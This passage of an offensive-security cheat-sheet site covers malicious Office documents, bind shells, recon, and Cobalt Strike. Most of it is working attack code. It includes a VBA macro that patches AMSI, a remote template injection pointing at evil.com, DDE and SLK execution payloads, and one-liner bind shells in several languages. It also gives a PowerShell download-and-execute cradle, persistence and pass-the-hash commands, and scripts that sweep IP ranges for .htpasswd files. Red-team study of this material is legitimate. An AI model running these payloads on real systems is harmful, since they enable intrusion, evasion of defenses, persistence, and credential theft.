https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba VBA - AMSI # The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/\n:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).\nThe AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro\nAMSI Trigger - https://github.com/synacktiv/AMSI-Bypass Private Declare PtrSafe Function GetProcAddress Lib \u0026#34;kernel32\u0026#34; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;LoadLibraryA\u0026#34; (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib \u0026#34;kernel32\u0026#34; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;RtlMoveMemory\u0026#34; (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 \u0026#39; 0xB8 MyByteArray(1) = 87 \u0026#39; 0x57 MyByteArray(2) = 0 \u0026#39; 0x00 MyByteArray(3) = 7 \u0026#39; 0x07 MyByteArray(4) = 128 \u0026#39; 0x80 MyByteArray(5) = 195 \u0026#39; 0xC3 AmsiDLL = LoadLibrary(\u0026#34;amsi.dll\u0026#34;) AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \u0026#34;AmsiScanBuffer\u0026#34;) result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub DOCX - Template Injection # :warning: Does not require \u0026ldquo;Enable Macro\u0026rdquo;\nRemote Template # A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\u0026#34; Target=\u0026#34;file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\u0026#34; TargetMode=\u0026#34;External\u0026#34;/\u0026gt;\u0026lt;/Relationships\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\u0026#34; Target=\u0026#34;https://evil.com/malicious.dotm\u0026#34; TargetMode=\u0026#34;External\u0026#34;/\u0026gt;\u0026lt;/Relationships\u0026gt; File gets zipped back up again and renamed to .docx Template Injections Tools # https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved! DOCX - DDE # Insert \u0026gt; QuickPart \u0026gt; Field Right Click \u0026gt; Toggle Field Code { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \u0026quot;/k calc.exe\u0026quot; } SLK - Excel # ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(\u0026#34;c:\\shell.cmd\u0026#34;) C;X1;Y102;K0;EHALT() E References # VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyvärinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental "},{"id":16,"href":"/docs/bind_shell_cheatsheet/","title":"Bind Shell Cheatsheet","section":"Docs","content":" Bind Shell # Perl # perl -e \u0026#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);exec(\u0026#34;/bin/bash -i\u0026#34;);};\u0026#39; Python # Single line :\npython -c \u0026#39;exec(\u0026#34;\u0026#34;\u0026#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\u0026#34;0.0.0.0\u0026#34;,51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\u0026#34;\u0026#34;\u0026#34;)\u0026#39; Expanded version :\nimport socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((\u0026#34;0.0.0.0\u0026#34;, 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP # php -r \u0026#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\u0026#34;0.0.0.0\u0026#34;,51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\u0026#34;$ \u0026#34;,2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\u0026#34;$in\u0026#34;,\u0026#34;r\u0026#34;);while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}\u0026#39; Ruby # ruby -rsocket -e \u0026#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,s,s,s)\u0026#39; Netcat Traditional # nc -nlvp 51337 -e /bin/bash Netcat OpenBsd # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc -lvp 51337 \u0026gt;/tmp/f Socat # user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane Powershell # https://github.com/besimorhino/powercat # Victim (listen) . .\\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002 "},{"id":17,"href":"/docs/methodology_and_enumeration/","title":"Bug Hunting Methodology and Enumeration","section":"Docs","content":" Bug Hunting Methodology and Enumeration # Passive recon # Using Shodan (https://www.shodan.io/) to detect similar app\ncan be integrated with nmap (https://github.com/glennzw/shodan-hq-nse) nmap --script shodan-hq.nse --script-args \u0026#39;apikey=\u0026lt;yourShodanAPIKey\u0026gt;,target=\u0026lt;hackme\u0026gt;\u0026#39; Using The Wayback Machine (https://archive.org/web/) to detect forgotten endpoints\nlook for JS files, old links curl -sX GET \u0026#34;http://web.archive.org/cdx/search/cdx?url=\u0026lt;targetDomain.com\u0026gt;\u0026amp;output=text\u0026amp;fl=original\u0026amp;collapse=urlkey\u0026amp;matchType=prefix\u0026#34; Using The Harvester\npython theHarvester.py -b all -d domain.com Active recon # Network discovery with masscan, nmap etc.\nrpcclient\n$ rpcclient -U \u0026#39;%\u0026#39; [target host] rpcclient $\u0026gt; querydominfo Domain: WORKGROUP Server: METASPLOITABLE Comment: metasploitable server (Samba 3.0.20-Debian) Total Users: 35 rpcclient $\u0026gt; enumdomusers user:[games] rid:[0x3f2] user:[nobody] rid:[0x1f5] user:[bind] rid:[0x4ba] enum4linux\nenum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/) Usage: ./enum4linux.pl [options] ip -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default “”) -p pass specify password to use (default “” -a Do all simple enumeration (-U -S -G -P -r -o -n -i). -o Get OS information -i Get printer information ============================== | Users on XXX.XXX.XXX.XXX | ============================== index: 0x1 Account: games Name: games Desc: (null) index: 0x2 Account: nobody Name: nobody Desc: (null) index: 0x3 Account: bind Name: (null) Desc: (null) index: 0x4 Account: proxy Name: proxy Desc: (null) index: 0x5 Account: syslog Name: (null) Desc: (null) index: 0x6 Account: user Name: just a user,111,, Desc: (null) index: 0x7 Account: www-data Name: www-data Desc: (null) index: 0x8 Account: root Name: root Desc: (null) Zone Transfer\nhost -t ns domain.local domain.local name server master.domain.local. host master.domain.local master.domain.local has address 192.168.1.1 dig axfr domain.local @192.168.1.1 List all the subdirectories and files # Using BFAC (Backup File Artifacts Checker): An automated tool that checks for backup artifacts that may disclose the web-application\u0026rsquo;s source code.\ngit clone https://github.com/mazen160/bfac Check a single URL bfac --url http://example.com/test.php --level 4 Check a list of URLs bfac --list testing_list.txt Using DirBuster or GoBuster\n./gobuster -u http://buffered.io/ -w words.txt -t 10 -u url -w wordlist -t threads More subdomain : ./gobuster -m dns -w subdomains.txt -u google.com -i gobuster -w wordlist -u URL -r -e Using a script to detect all phpinfo.php files in a range of IPs (CIDR can be found with a whois)\n#!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/phpinfo.php; done \u0026amp; Using a script to detect all .htpasswd files in a range of IPs\n#!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/.htpasswd; done \u0026amp; Looking for Web vulnerabilities # Look for private information in GitHub repos with GitRob\ngit clone https://github.com/michenriksen/gitrob.git gitrob analyze johndoe --site=https://github.acme.com --endpoint=https://github.acme.com/api/v3 --access-tokens=token1,token2 Explore the website with a proxy (ZAP/Burp Suite)\nStart proxy, visit the main target site and perform a Forced Browse to discover files and directories Map technologies used with Wappalyzer and Burp Suite (or ZAP) proxy Explore and understand available functionality, noting areas that correspond to vulnerability types Burp Proxy configuration on port 8080 (in .bashrc): alias set_proxy_burp=\u0026#39;gsettings set org.gnome.system.proxy.http host \u0026#34;http://localhost\u0026#34;;gsettings set org.gnome.system.proxy.http port 8080;gsettings set org.gnome.system.proxy mode \u0026#34;manual\u0026#34;\u0026#39; alias set_proxy_normal=\u0026#39;gsettings set org.gnome.system.proxy mode \u0026#34;none\u0026#34;\u0026#39; then launch Burp with : java -jar burpsuite_free_v*.jar \u0026amp; WAHH Task Checklist copied from http://mdsec.net/wahh/tasks.html\nSubscribe to the site and pay for the additional functionality to test\nLaunch a Nikto scan in case you missed something\nnikto -h http://domain.example.com Payment functionality - @gwendallecoguic\nif the webapp you\u0026rsquo;re testing uses an external payment gateway, check the doc to find the test credit numbers, purchase something and if the webapp didn\u0026rsquo;t disable the test mode, it will be free\nFrom https://stripe.com/docs/testing#cards : \u0026ldquo;Use any of the following test card numbers, a valid expiration date in the future, and any random CVC number, to create a successful payment. Each test card\u0026rsquo;s billing country is set to U.S. \u0026quot; e.g :\nTest card numbers and tokens\nNUMBER BRAND TOKEN 4242424242424242 Visa tok_visa 4000056655665556 Visa (debit) tok_visa_debit 5555555555554444 Mastercard tok_mastercard International test card numbers and tokens\nNUMBER TOKEN COUNTRY BRAND 4000000400000008 tok_at Austria (AT) Visa 4000000560000004 tok_be Belgium (BE) Visa 4000002080000001 tok_dk Denmark (DK) Visa 4000002460000001 tok_fi Finland (FI) Visa 4000002500000003 tok_fr France (FR) Visa References # [BugBounty] Yahoo phpinfo.php disclosure - Patrik Fehrenbach Nmap CheatSheet - HackerTarget "},{"id":18,"href":"/docs/cobalt_strike_all_you_need/","title":"Cobalt Strike","section":"Docs","content":" Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.\n$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 \u0026#34;password\u0026#34; [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://campaigns.example.com/download/dnsback\u0026#39;))\u0026#34; Summary # Infrastructure Redirectors Domain fronting OpSec Customer ID Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN \u0026amp; Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit Mimikatz Kit Sleep Mask Kit Thread Stack Spoofer Beacon Object Files NTLM Relaying via Cobalt Strike References Infrastructure # Redirectors # sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting # New Listener \u0026gt; HTTP Host Header Choose a domain in \u0026ldquo;Finance \u0026amp; Healthcare\u0026rdquo; sector OpSec # Don\u0026rsquo;t\nUse default self-signed HTTPS certificate Use default port (50050) Use 0.0.0.0 DNS response Metasploit compatibility, ask for a payload : wget -U \u0026quot;Internet Explorer\u0026quot; http://127.0.0.1/vl6D Do\nUse a redirector (Apache, CDN, \u0026hellip;) Firewall to only accept HTTP/S from the redirectors Firewall 50050 and access via SSH tunnel Edit default HTTP 404 page and Content type: text/plain No staging set hosts_stage to false in Malleable C2 Use Malleable Profile to taylor your attack to specific actors Customer ID # The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.\nThe Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later. The trial has a Customer ID value of 0. Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool Payloads # DNS Beacon # Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server\u0026rsquo;s A record.\nnslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean:\nNS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com.\t3600 A\tcampaigns.example.com directs to 10.10.10.10\t3600 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf echo \u0026#34;nameserver 8.8.4.4\u0026#34; \u0026gt;\u0026gt; /etc/resolv.conf Configuration:\nhost: campaigns.domain.com beacon: polling.campaigns.domain.com Interact with a beacon, and sleep 0 SMB Beacon # link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it.\nError Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don\u0026rsquo;t have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon # # deploy a beacon beacon\u0026gt; help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon\u0026gt; help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon\u0026#39;s commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility # Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads # https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c\n* Attacks \u0026gt; Packages \u0026gt; Payload Generator * Attacks \u0026gt; Packages \u0026gt; Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml $ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml Malleable C2 # List of Malleable Profiles hosted on Github\nCobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint Example of syntax\nset useragent \u0026#34;SOME AGENT\u0026#34;; # GOOD set useragent \u0026#39;SOME AGENT\u0026#39;; # BAD prepend \u0026#34;This is an example;\u0026#34;; # Escape Double quotes append \u0026#34;here is \\\u0026#34;some\\\u0026#34; stuff\u0026#34;; # Escape Backslashes append \u0026#34;more \\\\ stuff\u0026#34;; # Some special characters do not need escaping prepend \u0026#34;!@#$%^\u0026amp;*()\u0026#34;; Check a profile with ./c2lint.\nA result of 0 is returned if c2lint completes with no errors A result of 1 is returned if c2lint completes with only warnings A result of 2 is returned if c2lint completes with only errors A result of 3 is returned if c2lint completes with both errors and warning Files # # List the file on the specified directory beacon \u0026gt; ls \u0026lt;C:\\Path\u0026gt; # Change into the specified working directory beacon \u0026gt; cd [directory] # Delete a file\\folder beacon \u0026gt; rm [file\\folder] # File copy beacon \u0026gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon \u0026gt; download [C:\\filePath] # Lists downloads in progress beacon \u0026gt; downloads # Cancel a download currently in progress beacon \u0026gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon \u0026gt; upload [/path/to/file] Powershell and .NET # Powershell commands # # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon \u0026gt; powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon \u0026gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon \u0026gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon \u0026gt; psinject [pid][arch] [commandlet] [arguments] .NET remote execution # Run a local .NET executable as a Beacon post-exploitation job.\nRequire:\nBinaries compiled with the \u0026ldquo;Any CPU\u0026rdquo; configuration. beacon \u0026gt; execute-assembly [/path/to/script.exe] [arguments] beacon \u0026gt; execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement # :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe\nportscan: Performs a portscan on a specific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. :muscle: We can combine the jump module with the make_token or pth module for a quick \u0026ldquo;jump\u0026rdquo; to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe\nBeacon Remote Exploits ====================== jump [module] [target] [listener] psexec\tx86\tUse a service to run a Service EXE artifact psexec64\tx64\tUse a service to run a Service EXE artifact psexec_psh\tx86\tUse a service to run a PowerShell one-liner winrm\tx86\tRun a PowerShell script via WinRM winrm64\tx64\tRun a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash:\nmimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\u0026quot;powershell -w hidden\u0026quot; steal_token PID Assume Control of Artifact # Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN \u0026amp; Pivots # :warning: Covert VPN doesn\u0026rsquo;t work with W10, and requires Administrator access to deploy.\nUse socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon\u0026rsquo;s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.\n# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon \u0026gt; socks [PORT] beacon \u0026gt; socks [port] beacon \u0026gt; socks [port] [socks4] beacon \u0026gt; socks [port] [socks5] beacon \u0026gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] beacon \u0026gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging] # Proxy browser traffic through a specified Internet Explorer process. beacon \u0026gt; browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon \u0026gt; rportfwd [bind port] [forward host] [forward port] # spunnel : Spawn an agent and create a reverse port forward tunnel to its controller. ~= rportfwd + shspawn. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin beacon\u0026gt; spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin # spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller # then you can handle the connect back on your MSF multi handler beacon\u0026gt; spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin Kits # Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike Elevate Kit # UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)\nbeacon\u0026gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit # https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list # Add a persistence SharPersist -t schtaskbackdoor -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Something Cool\u0026#34; -m add SharPersist -t schtaskbackdoor -n \u0026#34;Something Cool\u0026#34; -m remove SharPersist -t service -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Service\u0026#34; -m add SharPersist -t service -n \u0026#34;Some Service\u0026#34; -m remove SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add -o hourly SharPersist -t schtask -n \u0026#34;Some Task\u0026#34; -m remove Resource Kit # The Resource Kit is Cobalt Strike\u0026rsquo;s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows\nArtifact Kit # Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -\u0026gt; Script Manager, and load the artifact.cna script from that technique\u0026rsquo;s folder.\nArtifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :\nDownload the artifact kit : Go to Help -\u0026gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c/patch.exe, e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -\u0026gt; Script Manager \u0026gt; Load .cna Mimikatz Kit # Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724) Load the mimikatz.cna aggressor script Use mimikatz functions as normal Sleep Mask Kit # The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.\nUse the included build.sh or build.bat script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.\nThread Stack Spoofer # An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.\nThread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option artifactkit_stack_spoof in the config file arsenal_kit.config.\nBeacon Object Files # A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs\nExample: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h\nCompile # To compile this with Visual Studio: cl.exe /c /GS- hello.c /Fohello.o # To compile this with x86 MinGW: i686-w64-mingw32-gcc -c hello.c -o hello.o # To compile this with x64 MinGW: x86_64-w64-mingw32-gcc -c hello.c -o hello.o Execute: inline-execute /path/to/hello.o NTLM Relaying via Cobalt Strike # beacon\u0026gt; socks 1080 kali\u0026gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://\u0026lt;IP_TARGET\u0026gt; beacon\u0026gt; rportfwd_local 8445 \u0026lt;IP_KALI\u0026gt; 445 beacon\u0026gt; upload C:\\Tools\\PortBender\\WinDivert64.sys beacon\u0026gt; PortBender redirect 445 8445 References # Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe 